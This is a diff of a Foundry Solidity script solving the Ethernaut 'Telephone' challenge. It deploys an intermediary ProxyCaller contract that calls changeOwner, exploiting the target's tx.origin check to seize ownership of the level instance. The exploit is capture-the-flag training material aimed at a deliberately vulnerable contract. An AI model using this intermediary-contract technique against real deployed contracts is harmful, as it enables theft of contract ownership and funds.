@@ -5,6 +5,10 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface ITelephone {
+    function owner() external view returns (address);
+    function changeOwner(address _owner) external;
+}
 
 contract TelephoneSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;
@@ -16,14 +20,27 @@ contract TelephoneSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
+        ITelephone telephone = ITelephone(challengeInstance);
+        ProxyCaller proxyCaller = new ProxyCaller();
 
+        address ownerBefore = telephone.owner();
+        console2.log("Owner Before: ", ownerBefore);
 
+        proxyCaller.callChangeOwner(challengeInstance, vm.addr(heroPrivateKey));
+
+        address ownerAfter = telephone.owner();
+        console2.log("Owner After: ", ownerAfter);
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
         require(levelSuccess, "Challenge not passed yet");
         vm.stopBroadcast();
-
         console2.log(successMessage(4));
+    }
+}
+
+contract ProxyCaller {
+    function callChangeOwner(address contract_, address owner_) external {
+        ITelephone(contract_).changeOwner(owner_);
     }
 }
